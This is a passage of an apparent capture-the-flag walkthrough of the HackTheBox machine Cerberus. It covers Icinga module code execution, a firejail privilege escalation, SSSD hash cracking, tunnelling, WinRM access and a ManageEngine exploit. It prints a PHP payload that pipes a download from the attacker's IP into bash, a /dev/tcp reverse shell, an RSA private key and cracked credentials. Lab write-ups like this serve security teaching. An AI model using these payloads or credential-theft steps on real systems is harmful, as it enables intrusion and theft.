ogxWXw+3Ndy+FeUd/J8B0jTFdoBTrmW7iWJzhoz9AT6YdeQs4zKRoK1g4tnaxB3c
...[snip]...
fO0EtCgQ4FY3Ei4Eh/1Eup2gaHsfwnbegQ0A39rdey4gOhG5FtQ=
-----END RSA PRIVATE KEY-----
*/

```

### RCE

#### Write to Web Root [Fail]

The question now is how to leverage this file read and file write to get execution on Cerberus.

The obvious idea is to write a PHP webshell into the web root and access the file directly through there. To do that, I’ll need to located it, and it’ll have to be writable. I am able to find `index.php` in `/var/www/html` that does the redirect to Icinga:

```

oxdf@hacky$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/var/www/html/index.php
<?php
header("Location: http://icinga.cerberus.local:8080/icingaweb2");
?>

```

I’ll try to write there, but the form submission returns an error:

![image-20230322173915266](/img/image-20230322173915266.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

This error shows that the current user can’t write to that folder. It does leak the path to the `Icinga` instance in `/usr/share`. I can try to write in there, but that entire file tree is not writable as well.

This is called out as the default behavior in the blog post:

> When installed using the official Linux packages, the PHP scripts of Icinga Web 2 are deployed under `/usr/share/icingaweb2`. They are owned by the `root` user and hence can’t be modified with the identity of `www-data` under which the HTTP server is running.

#### Icinga Module

The blog post has a section at the end that talks about how to deal with the un-writeable web directories:

> While this would prevent straightforward exploitation based on planting a PHP file under this directory and accessing them, we found another technique that attackers could use to obtain the execution of arbitrary code.
>
> Icinga has a notion of modules, self-contained third-party code that extends the interface’s capabilities (e.g., to add Grafana support). These modules are stored under `/usr/share/icingaweb2/modules` by default, but administrators can also change this path directly from the interface.
>
> The setting `global_module_path` expects colon-separated paths from where modules are located. Changing this value to a path where the previously demonstrated vulnerability can write, say `/dev/shm/`, setting `global_module_path` to `/dev/`, and enabling the new module named `shm` allows executing arbitrary PHP code.

#### Update Modules Path

Under Configuration > Application > General there’s a line to set the “Module Path”:

![image-20230322175618486](/img/image-20230322175618486.png)

If I change the path to `/dev`, it reports success:

![image-20230322175644378](/img/image-20230322175644378.png)

This does work, though it also seems like there’s a cron on Cerberus setting it back periodically.

#### Malicious Module

[This post](https://icinga.com/blog/2020/10/28/build-your-own-icinga-module/) by Icinga provides resources for creating a module, including their [class](https://github.com/Icinga/icingaweb2-module-training/blob/master/doc/extending-icinga-web-2.md) and some examples.

The module has a large format:

```

.
└── training                Basic directory of the module
    ├── application
    │   ├── clicommands     CLI Commands
    │   ├── controllers     Web Controller
    │   ├── forms           Forms
    │   ├── locale          Translations
    │   └── views
    │       ├── helpers     View Helper
    │       └── scripts     View Scripts
    ├── configuration.php   Deploy menu, dashlets, permissions
    ├── doc                 Documentation
    ├── library
    │   └── Training        Library Code, Module Namespace
    ├── module.info         Module Metadata
    ├── public
    │   ├── css             Own CSS Code
    │   ├── img             Own Images
    │   └── js              Own JavaScript
    ├── run.php             Registration of hooks and more
    └── test
        └── php             PHP Unit Tests

```

I don’t need most of that. `configuration.php` seems like a good choice to work with, as it will have to be loaded either first or towards the beginning.

It takes a bit of playing around with the file to get it to work, but eventually I got this:

```

<?php

system("ping -c 1 10.10.14.6");

/*
-----BEGIN RSA PRIVATE KEY-----
MIIG4gIBAAKCAYEArtexfMckHYPk6IjX0N5s/AKmtR//U5FWsxcbsBaNTnKfPJFp
...[snip]...
fO0EtCgQ4FY3Ei4Eh/1Eup2gaHsfwnbegQ0A39rdey4gOhG5FtQ=
-----END RSA PRIVATE KEY-----
*/

```

When I upload this to `/dev/shm/configuration.php`, and then (after making sure the module path is still `/dev`) visit the modules page, I’ll find `shm` there. Clicking on it shows the status, and at the bottom there’s the output of a `ping`:

![image-20230322180954307](/img/image-20230322180954307.png)

And at `tcpdump` on my machine:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:07:41.761598 IP 10.10.11.205 > 10.10.14.6: ICMP echo request, id 1000, seq 1, length 64
18:07:41.761622 IP 10.10.14.6 > 10.10.11.205: ICMP echo reply, id 1000, seq 1, length 64

```

#### Shell

I’ll replace the `ping` with a command to get a reverse shell:

```

<?php

system("curl 10.10.14.6/shell|bash");

/*
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
*/

```

I’ll write `shell` to be a simple [Bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

Now I’ll trigger the module, and I get a shell:

```

oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.205 49812
bash: cannot set terminal process group (633): Inappropriate ioctl for device
bash: no job control in this shell
www-data@icinga:/usr/share/icingaweb2/public$

```

I’ll do the [standard shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@icinga:/usr/share/icingaweb2/public$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@icinga:/usr/share/icingaweb2/public$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo; fg
nc -lvnp 443
            resert
reset: unknown terminal type unknown
Terminal type? screen
www-data@icinga:/usr/share/icingaweb2/public$

```

## Shell as root on icinga

### Enumeration

It’s very clear that I’m in a container or VM. The IP address is 172.16.22.2, which is not what I connected to. And it’s Linux and not Windows.

The container is relatively empty, other than the Icinga install. I can’t run `sudo`, and there’s nothing obvious to work with or any obvious attack surface. Given that this is supposed to be a Windows box I must be in either a container or a VM. I don’t see any of the obvious signs of docker (no `.dockerenv` file in `/`, for example).

There’s a single user on the box, matthew, but I can’t access their home directory.

There is one SetUID binary that stands out as unusual, `firejail`:

```

www-data@icinga:/$ find / -perm -4000 2>/dev/null
/usr/sbin/ccreds_chkpwd
/usr/bin/mount
/usr/bin/sudo
/usr/bin/firejail
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/ksu
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1

```

### Escape

#### Background

[Firejail](https://firejail.wordpress.com/) is a security sandbox that:

> reduces the risk of security breaches by restricting the running environment of untrusted applications using [Linux namespaces](https://lwn.net/Articles/531114/) and [seccomp-bpf](https://l3net.wordpress.com/2015/04/13/firejail-seccomp-guide/). It allows a process and all its descendants to have their own private view of the globally shared kernel resources, such as the network stack, process table, mount table.

Searching for “firejail exploit” returns [this Openwall post](https://www.openwall.com/lists/oss-security/2022/06/08/10) that includes a Python POC. This vulnerability is tracked as CVE-2022-31214.

#### Exploit

I’ll download the [script](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) and serve it from my VM with a Python webserver. I’ll fetch it to the icinga box with `wget`:

```

www-data@icinga:/dev/shm$ wget 10.10.14.6/firejail.py
--2023-03-22 22:40:34--  http://10.10.14.6/firejail.py
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8649 (8.4K) [text/x-python]
Saving to: 'firejail.py'

firejail.py         100%[===================>]   8.45K  --.-KB/s    in 0s

2023-03-22 22:40:35 (99.6 MB/s) - 'firejail.py' saved [8649/8649]
www-data@icinga:/dev/shm$ chmod +x firejail.py

```

Reviewing the exploit, it needs two terminals to work. I’ll get a second one using the same foothold (and get a full PTY using the script technique), and run the exploit:

```

www-data@icinga:/dev/shm$ ./firejail.py
You can now run 'firejail --join=12552' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.

```

In the other terminal, I’m able to join that session, but the command it gives fails:

```

www-data@icinga:/$ firejail --join=12552
changing root to /proc/12552/root
Warning: cleaning all supplementary groups
Child process initialized in 15.15 ms
www-data@icinga:/$ sudo su -
www-data is not in the sudoers file.  This incident will be reported.

```

Luckily, just `su -` works:

```

www-data@icinga:/$ su -
root@icinga:~#

```

## Shell as matthew on Cerberus

### Enumeration

#### Host

Other than some clean copies of config files that may get overwritten in the icinga attack, there’s nothing interesting in `/root`. root is running a few crons every 10 minutes, but these are related to cleaning up icinga as well:

```

root@icinga:~# crontab -l
...[snip]...
# m h  dom mon dow   command
*/10 * * * * cp /root/cleanup/resources.ini /etc/icingaweb2/resources.ini
*/10 * * * * cp /root/cleanup/config.ini /etc/icingaweb2/config.ini
*/10 * * * * cp /root/cleanup/roles.ini /etc/icingaweb2/roles.ini
*/10 * * * * rm /etc/icingaweb2/ssh/*

```

Looking at the process list, there are a few processes involving `sssd`:

```

root@icinga:~# ps auxww | grep sssd
root         574  0.0  0.7  93916  6796 ?        Ss   Mar21   0:00 /usr/sbin/sssd -i --logger=files
root        1047  0.0  0.8  98216  7672 ?        S    Mar21   0:02 /usr/libexec/sssd/sssd_be --domain cerberus.local --uid 0 --gid 0 --logger=files
root        1053  0.0  1.3 109128 12348 ?        S    Mar21   0:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        1054  0.0  1.2  83340 11316 ?        S    Mar21   0:02 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files

```

Those are interesting.

#### Network

The IP for the box is 172.16.22.2:

```

root@icinga:~# ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.22.2  netmask 255.255.255.240  broadcast 172.16.22.15
        inet6 fe80::215:5dff:fe5f:e801  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:5f:e8:01  txqueuelen 1000  (Ethernet)
        RX packets 149189  bytes 24717385 (24.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 150923  bytes 39334978 (39.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

As I noted above, I must be in a container or a VM. A quick `ping` sweep will show only one other host in the network:

```

root@icinga:~# for i in {1..254}; do (ping -c 1 172.16.22.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.16.22.1: icmp_seq=1 ttl=128 time=3.26 ms
64 bytes from 172.16.22.2: icmp_seq=1 ttl=64 time=0.025 ms

```

.1 is likely the host.

I’ll upload a [statically compiled nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and point it at the presumed host machine:

```

root@icinga:~# ./nmap -p- --min-rate 10000 172.16.22.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-23 11:56 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for DC.cerberus.local (172.16.22.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00093s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE
5985/tcp  open  unknown
63614/tcp open  unknown
MAC Address: 00:15:5D:5F:E8:00 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 20.07 seconds

```

Not much is open, but 5985 is, which is WinRM. If I can find creds, I can potentially get a shell over that.

#### sssd

`sssd` is an [open source client for enterprise identity management](https://sssd.io/). It allows for Linux machines to be joined into an Active Directory domain.

HackTricks has a [page on Linux AD](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#ccache-ticket-reuse-from-sssd-kcm), and a section mentions SSSD:

> SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. By default, the key is only readable if you have **root** permissions.

On icinga, there is a `secrets.ldb` file, but no `secrets.mkey`. l’ll look at bit at the `secrets.ldb` file (`strings` mostly), but not find much.

Stepping back, I’ll look at the `sss` directory:

```

root@icinga:/var/lib/sss# find . -type f
./secrets/secrets.ldb
./db/cache_cerberus.local.ldb
./db/ccache_CERBERUS.LOCAL
./db/sssd.ldb
./db/config.ldb
./db/timestamps_cerberus.local.ldb
./mc/initgroups
./mc/group
./mc/passwd
./pubconf/krb5.include.d/domain_realm_cerberus_local
./pubconf/krb5.include.d/localauth_plugin
./pubconf/krb5.include.d/krb5_libdefaults
./pubconf/kdcinfo.CERBERUS.LOCAL

```

There are a few files in the `db` directory. Running strings on `cache_cerberus.local.ldb` returns a bunch of data, including references to the matthew user and some hashes:

```

root@icinga:/var/lib/sss/db# strings cache_cerberus.local.ldb
...[snip]...
1000
name
matthew@cerberus.local
objectCategory
user
uidNumber
1000
isPosix
TRUE
lastUpdate
1677672476
dataExpireTimestamp
initgrExpireTimestamp
cachedPassword
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
cachedPasswordType
lastCachedPasswordChange
1677672476
...[snip]...

```

### Shell over WinRM

#### Crack Hash

I’ll run the hash recovered above through `rockyou.txt` with `hashcat`:

```

$ hashcat matthew.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0:147258369
...[snip]...

```

It cracks in less then 15 seconds.

#### Tunnel

I’ll grab a copy of [Chisel](https://github.com/jpillora/chisel) and upload it to icinga as well. On my VM, I’ll start the server (giving it a different port since Burp is already using 8080 on my system and using `--reverse` so that I can do reverse tunnels):

```

oxdf@hacky$ /opt/chisel/chisel_1.8.1_linux_amd64 server -p 8000 --reverse
2023/03/23 07:58:49 server: Reverse tunnelling enabled
2023/03/23 07:58:49 server: Fingerprint gpiRi6AETqFFsiV0LT/mGE87dk112hszOHa7ke0bHSY=
2023/03/23 07:58:49 server: Listening on http://0.0.0.0:8000

```

On icinga, I’ll run `./chisel_1.8.1_linux_amd64 client 10.10.14.6:8000 R:5985:172.16.22.1:5985` to create listener on my host on 5985 that will tunnel through the VM and then forward to the host on 5985. The server shows the connection:

```

2023/03/23 08:00:59 server: session#1: tun: proxy#R:5985=>172.16.22.1:5985: Listening

```

#### Evil-WrinRM

I’ll use `evil-winrm` to connect and get a shell:

```

oxdf@hacky$ evil-winrm -i 127.0.0.1 -u matthew -p 147258369

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\matthew\Documents>

```

I am able to read the user flag:

```
*Evil-WinRM* PS C:\Users\matthew\desktop> cat user.txt
a8516fa0************************

```

For a while I was getting the following error:

```

oxdf@hacky$ evil-winrm -i 127.0.0.1 -u matthew -p 147258369

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - Connection refused - connect(2) for "127.0.0.1" po
rt 5985 (127.0.0.1:5985)

Error: Exiting with code 1

```

This is due to the default OpenSSL configuration on my Ubuntu VM, which mikedec [posted a solution for](https://forum.hackthebox.com/t/evil-winrm-error-on-connection-to-host/257342/14) in the HTB Forums. Adding those lines in my `/etc/ssl/openssl.cnf` file fixes the issue.

## Shell as aris on Cerberus

### Enumeration

#### File System

There’s nothing else of interest in matthew’s home directory. IIS is installed, but the `C:\inetpub\wwwroot` directory just has the default IIS page.

Looking at the installed programs, there are a few in `Program Files` and `Program Files (x86)` that are interesting:
- Google - Chrome - Is there a simulated user on this box?
- Hyper-V - likely what is running the Icinga VM
- Managed Engine / AD SelfService Plus

#### AD SelfService Plus

The `ManageEngine` directory has a `ADSelfService Plus` folder, which has the application:

```
*Evil-WinRM* PS C:\program files (x86)\ManageEngine\ADSelfService Plus>        ls

    Directory: C:\program files (x86)\ManageEngine\ADSelfService Plus

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/14/2023   6:49 AM                Backup
d-----        3/23/2023   6:41 AM                bin
d-----        1/29/2023  11:15 AM                blog
d-----        2/14/2023   7:55 AM                conf
d-----        1/29/2023  11:18 AM                data
d-----        1/29/2023  11:12 AM                images
d-----        1/29/2023  11:12 AM                jre
d-----         3/1/2023   3:29 AM                lib
d-----        1/29/2023  11:12 AM                licenses
d-----        3/23/2023   6:41 AM                logs
d-----        1/29/2023  11:15 AM                pgsql
d-----        1/29/2023  11:13 AM                resources
d-----        1/29/2023  11:13 AM                Scripts
d-----        3/23/2023   7:00 AM                temp
d-----        1/29/2023  11:13 AM                tools
d-----        1/29/2023  11:13 AM                webapps
d-----        1/29/2023  11:17 AM                work
------       10/21/2022  12:26 AM           4108 COPYRIGHT
-a----        1/29/2023  11:14 AM            227 InjectorInfo.txt
------       10/21/2022  12:26 AM          11981 LICENSE_AGREEMENT
------       10/21/2022  12:26 AM          17165 README.html
-a----        1/29/2023  11:14 AM         120626 unpacklog.txt

```

`Backup` has a `.ezip` file:

```
*Evil-WinRM* PS C:\program files (x86)\ManageEngine\ADSelfService Plus>ls Backup

    Directory: C:\program files (x86)\ManageEngine\ADSelfService Plus\Backup

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/15/2023   7:16 AM         320225 OfflineBackup_20230214064809.ezip

```

If that has a backup of the active directory database, it would have passwords or hashes I could use. I’ll download a copy. I often have trouble with the `download` in Evil-WinRM, so I’ll just create an SMB server:

```

oxdf@hacky$ smbserver.py -username oxdf -password oxdf -smb2support share .
Impacket v0.10.1.dev1+20230216.13520.d4c06e7f - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Now I’ll copy the file into it:

```
*Evil-WinRM* PS C:\program files (x86)\ManageEngine\ADSelfService Plus\Backup> net use \\10.10.14.6\share /u:oxdf oxdf
The command completed successfully.
*Evil-WinRM* PS C:\program files (x86)\ManageEngine\ADSelfService Plus\Backup> copy OfflineBackup_20230214064809.ezip \\10.10.14.6\share\

```

### Access Backup

#### Unzip Fails

`unzip` doesn’t seem to be able to handle this kind of archive:

```

oxdf@hacky$ unzip OfflineBackup_20230214064809.ezip
Archive:  OfflineBackup_20230214064809.ezip
  End-of-central-directory signature not found.  Either this file is not
  a zipfile, or it constitutes one disk of a multi-part archive.  In the
  latter case the central directory and zipfile comment will be found on
  the last disk(s) of this archive.
note:  OfflineBackup_20230214064809.ezip may be a plain executable, not an archive
unzip:  cannot find zipfile directory in one of OfflineBackup_20230214064809.ezip or
        OfflineBackup_20230214064809.ezip.zip, and cannot find OfflineBackup_20230214064809.ezip.ZIP, period.

```

`7z` has no issue listing the files in the archive:

```

oxdf@hacky$ 7z l OfflineBackup_20230214064809.ezip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 320225 bytes (313 KiB)

Listing archive: OfflineBackup_20230214064809.ezip
--
Path = OfflineBackup_20230214064809.ezip
Type = 7z
Physical Size = 320225
Headers Size = 8337
Method = LZMA2:3m 7zAES
Solid = +
Blocks = 1

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-02-14 10:48:39 ....A            0            0  AAARadiusConfig.txt
2023-02-14 10:48:39 ....A            0            0  AAARememberMeInfo.txt
2023-02-14 10:48:39 ....A            0            0  ADMPDomainGroupRoleMapping.txt
2023-02-14 10:48:40 ....A            0            0  ADSADComputerGeneralDetails.txt
2023-02-14 10:48:40 ....A            0            0  ADSADContactGeneralDetails.txt
2023-02-14 10:48:40 ....A            0            0  ADSADGroupGeneralDetails.txt
2023-02-14 10:48:40 ....A            0            0  ADSADOUGeneralDetails.txt
2023-02-14 10:48:40 ....A            0            0  ADSADSyncAudit.txt
2023-02-14 10:48:40 ....A            0            0  ADSADSyncMultiDCResults.txt
2023-02-14 10:48:44 ....A            0            0  ADSADSyncMultiDCResultsAudit.txt
2023-02-14 10:48:44 ....A            0            0  ADSADSyncObjVsManadatorySync.txt
...[snip]...

```

There are a lot of files. Given the number of files, I’ll move to a clean directory to not muck things up when it does unzip (or fail creating empty files).

Extracting needs a password:

```

oxdf@hacky$ 7z x OfflineBackup_20230214064809.ezip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 320225 bytes (313 KiB)

Extracting archive: OfflineBackup_20230214064809.ezip
--
Path = OfflineBackup_20230214064809.ezip
Type = 7z
Physical Size = 320225
Headers Size = 8337
Method = LZMA2:3m 7zAES
Solid = +
Blocks = 1

Enter password (will not be echoed):

```

#### Get Password

The [docs](https://www.manageengine.com/products/self-service-password/kb/password-selfservice-database-backup-restore.html) show a default password for ADSelfService Plus:

![image-20230323101654133](/img/image-20230323101654133.png)

If the admin hasn’t configured it, the password is the filename backwards. They don’t include the extension in the example:

```

oxdf@hacky$ echo "OfflineBackup_20230214064809" | rev
90846041203202_pukcaBenilffO

```

That works! There’s almost a thousand files:

```

oxdf@hacky$ ls -1 | wc -l
980

```

#### Initial Analysis

There is a file called `hashes.txt`:

```

oxdf@hacky$ cat offlinebackup/hash.txt
$2a$12$IkmRrMCQ6KAuzaMTp4DMxeu0XGpLKuXbz2JMbLVG3gCYTg/JPlE9q

```

There’s a couple other bcrypt hashes in the files as well:

```

oxdf@hacky$ grep '\$2a\$' offlinebackup/*
offlinebackup/AaaPassword.txt:601       $2a$12$jwMNhQ6chs7CphGi8Fw8Ku7qyG9gbVYiQswtVRskV8xL/RdQG/2oy    bcrypt  \\xc30c040901022776769ac396f152d24e01225f82e4aa385fa3d4b1934d6bc64c2ab677072a4b9d313575866b97952871b15bb6d871212c563bee00031210547944047202132282da13db02d25bb7dfcd4197726db4601b46438a28b00992    2       3       1675090753256   \N
offlinebackup/AaaPassword.txt:901       $2a$12$KwGbROsw8B/4izvgrIqLWuZdZNo0spf0CXl0mXIbiqfzLbs5Zfj6m    bcrypt  \\xc30c0409010278d716e4464eacc6d24e01759ea5dd6477aecabcb1ca59874cd222d330acf99c349fb82c6957b057b8d4b06f0e5fd60ab97f7d0a1470ae825bca3aba5ebe78a21a8113ea78fe85929fd1e6dbf977cd46ced4a636b296f59f    2       3       1675091281022   \N
offlinebackup/AaaPassword.txt:1 $2a$12$IkmRrMCQ6KAuzaMTp4DMxeu0XGpLKuXbz2JMbLVG3gCYTg/JPlE9q    bcrypt  \\xc30c04090102e4e9ad9e9515b069d24e01a00107d43d87ca15343d1671dad0cb23cb8f713e65f5aa5e64a86c13d965e8299ec72fc86374019d48b8dadb1d66ac818c9973623d61fd6b45777931aad69b1318ffc4e2d87e5300be6abb69da    2       3       1676385645256   12
offlinebackup/hash.txt:$2a$12$IkmRrMCQ6KAuzaMTp4DMxeu0XGpLKuXbz2JMbLVG3gCYTg/JPlE9q

```

I’ll try to crack these with `hashcat`, but nothing cracks quickly.

The backup looks like a dead end for now.

### CVE-2022-47966

#### Find Exploit

Some Googling for “ADSelfService Plus exploit” will turn up [this merge request](https://github.com/rapid7/metasploit-framework/pull/17556) for an exploit into Metasploit. It was merged on Feb 7 2023, just in time for Cerberus’ release on 18 March, and it’s in my local `msfconsole` now. There is also [a POC](https://github.com/horizon3ai/CVE-2022-47966) from the researcher who discovered this vulnerability, but I didn’t try it.

```

msf6 > search adself

Matching Modules
================

   #  Name                                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                                        ---------------  ----       -----  -----------
   0  exploit/windows/http/manageengine_adselfservice_plus_cve_2021_40539         2021-09-07       excellent  Yes    ManageEngine ADSelfService Plus CVE-2021-40539
   1  exploit/windows/http/manageengine_adselfservice_plus_cve_2022_28810         2022-04-09       excellent  Yes    ManageEngine ADSelfService Plus Custom Script Execution
   2  exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966  2023-01-10       excellent  Yes    ManageEngine ADSelfService Plus Unauthenticated SAML RCE

```

Looking at the options is a good way to figure out what I need for this exploit:

```

msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > options

Module options (exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   GUID                          yes       The SAML endpoint GUID
   ISSUER_URL                    yes       The Issuer URL used by the Identity Provider which has been configured as the SAML authentication provider for the target server
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RELAY_STATE                   no        The Relay State. Default is "http(s)://<rhost>:<rport>/samlLogin/LoginAuth"
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        9251             yes       The target port (TCP)
   SSL          true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
